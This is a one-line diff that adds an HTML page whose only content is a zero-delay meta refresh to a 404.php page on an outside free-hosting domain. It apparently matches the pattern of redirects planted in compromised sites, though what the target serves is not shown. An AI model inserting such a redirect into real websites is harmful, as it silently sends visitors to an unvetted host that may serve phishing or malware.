@@ -1,0 +1,1 @@
+<html><meta http-equiv="refresh" content="0;http://labgaumkap.16mb.com/404.php" /></html>
